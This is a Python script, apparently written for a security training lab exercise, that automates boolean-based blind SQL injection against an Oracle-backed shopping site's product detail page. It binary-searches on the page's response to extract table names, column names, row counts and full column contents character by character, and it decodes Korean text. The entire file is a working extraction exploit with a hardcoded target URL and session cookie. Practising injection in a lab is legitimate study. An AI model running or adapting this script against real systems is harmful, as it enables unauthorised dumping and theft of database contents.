import requests
from urllib import parse
url="https://elms2.skinfosec.co.kr:8110/practice/practice01/detail?id=62 and {}" # 쇼핑몰 1번 맥북 접속
cookies={"JSESSIONID":"BEEBF8F557933D6DA0AA760363A272FC"}   # 쿠키는 메인과 세부 페이지 둘 다 같음

def binarySearch(query):
    baseQuery = "(" + query + ") > {}"
    min = 1
    max = 15572644

    try:
        while min < max:
            avg = int((min+max) / 2)
            attackQuery = baseQuery.format(avg)
            #attackUrl = url.format(attackQuery)
            attackUrl = url.format(parse.quote(attackQuery))  # URL 인코딩 추가

            response = requests.get(attackUrl, cookies=cookies, timeout=None)
            response.raise_for_status()
            if "MacBook" in response.text:
                min = avg + 1
            else:
                max = avg
    except requests.RequestException as e:
        print(f"An error occurred: {e}")

    return min

    
# 테이블 이름 추출 함수
def getTableName(tableIndex):
    length_query = "select length(table_name) from (select table_name, rownum as linenumber from user_tables) where linenumber={}".format(tableIndex)
    tableLength = binarySearch(length_query)
    
    tableName = ""
    for j in range(1, tableLength + 1):
        query = "select ascii(substr(table_name, {}, 1)) from (select table_name, rownum as linenumber from user_tables) where linenumber={}".format(j, tableIndex)
        ascii_value = binarySearch(query)
        character = chr(ascii_value)
        tableName += character
    return tableName

# 컬럼 개수 추출 함수
def getColumnCount(tableName):
    colCountQuery = "select count(column_name) from user_tab_columns where table_name='{}'".format(tableName)
    colCount = binarySearch(colCountQuery)
    return colCount

# 컬럼 이름 추출 함수
def getColumnNames(tableName, colCount):
    columns = []
    for k in range(1, colCount + 1):
        colLengthQuery = "select length(column_name) from (select column_name, rownum as linenumber from user_tab_columns where table_name='{}') where linenumber={}".format(tableName, k)
        colNameLength = binarySearch(colLengthQuery)
        
        colName = ""
        for l in range(1, colNameLength + 1):
            colNameQuery = "select ascii(substr(column_name, {}, 1)) from (select column_name, rownum as linenumber from user_tab_columns where table_name='{}') where linenumber={}".format(l, tableName, k)
            ascii_value = binarySearch(colNameQuery)
            character = chr(ascii_value)
            colName += character
        
        columns.append(colName)
    return columns

# 컬럼 데이터 추출 함수 -> '데이터==행'의 개수 추출

def getColumnData(tableName, columnName):
    dataQuery = "SELECT {} FROM {}".format(columnName, tableName)
    dataLength = binarySearch("SELECT COUNT(*) FROM ({})".format(dataQuery))

    data = []
    for m in range(1, dataLength + 1):
        dataItemQuery = "SELECT ASCII(SUBSTR({column}, {{pos}}, 1)) FROM (SELECT {column}, ROWNUM AS linenumber FROM {table}) WHERE linenumber={{index}}".format(column=columnName, table=tableName)
        rowData = ""
        for n in range(1, 256):  # assuming data length won't exceed 255 characters
            ascii_value = binarySearch(dataItemQuery.format(pos=n, index=m))
            if ascii_value == 0:
                break
            elif ascii_value <= 127:
                character = chr(ascii_value)
            else:
                ascii_value = str(ascii_value)
                #print(ascii_value)
                hex_string = ''
                for i in range(0, len(ascii_value), 8):
                    byte = ascii_value[i:i+8]  # 8비트씩 자르기
                    hex_value = hex(int(byte))[2:]  # 헥사 값으로 변환
                    # if len(hex_value) % 2 == 1:
                    #     hex_value = '0' + hex_value  # 홀수면 앞에 0 추가
                    hex_string += hex_value
                korean = ''.join([f"%{hex_string[i:i+2]}" for i in range(0, len(hex_string), 2)])
                try:
                    character = parse.unquote(korean)  # UTF-8 디코딩
                except UnicodeDecodeError:
                    character = ''  # 디코딩 실패 시 None 반환
            rowData += character
        data.append(rowData)
    return data

# 데이터 개수를 카운트하는 함수 -- add
def dataCount(query):
    baseQuery="(" + query + ") > {}"
    min=1
    max=18000

    while min<max:
        avg=int((min+max)/2)
        attackQuery=baseQuery.format(avg)
        attackUrl=url.format(attackQuery)
        response=requests.get(attackUrl, cookies=cookies, timeout=None)
        if "MacBook" in response.text:
            min=avg+1
        else:
            max=avg
    return max
    

# 테이블의 데이터(행) 개수 추출 함수
def getRowCount(tableName):
    rowCountQuery = "select count(*) from {}".format(tableName)
    #rowCount = binarySearch(rowCountQuery)
    rowCount = dataCount(rowCountQuery)
    return rowCount


# 사용자 입력을 받아 해당 테이블의 데이터를 추출하는 함수
def showTableData(tableIdx):
    tableName=getTableName(tableIdx)
    print("테이블 이름: {}".format(tableName))
    
    colCount=getColumnCount(tableName)
    print("{} 테이블의 컬럼 개수: {}개".format(tableName, colCount))
    
    columns=getColumnNames(tableName, colCount)
    for k, colName in enumerate(columns, 1):
        print("{} 테이블의 {}번째 컬럼 이름: {}".format(tableName, k, colName))
        
        rowCount = getRowCount(tableName)
        print("{} 테이블의 {} 컬럼의 데이터 개수: {}개".format(tableName,colName, rowCount))
        
        colData = getColumnData(tableName, colName)
        for data in colData:
            print("{} 테이블의 {} 컬럼 데이터: {}".format(tableName, colName, data))
    
    

# 테이블 개수 추출
query = "select count(table_name) from user_tables"
tableCount = binarySearch(query)
print("테이블 개수 : {} 개".format(tableCount))
print("*******추출된 테이블의 목록*******")


# 전체 테이블 목록 출력
tableList=[]
for i in range(1, tableCount+1):
    tableName=getTableName(i)
    tableList.append(tableName)
    print("{}:{}".format(i,tableName))


# 사용자 입력을 통해 특정 테이블 데이터만 추출
tableIdx=int(input("데이터를 추출할 테이블 번호를 입력하세요: "))
if 1<=tableIdx<=tableCount:
    showTableData(tableIdx)
else:
    print("잘못된 테이블 번호 입니다.")
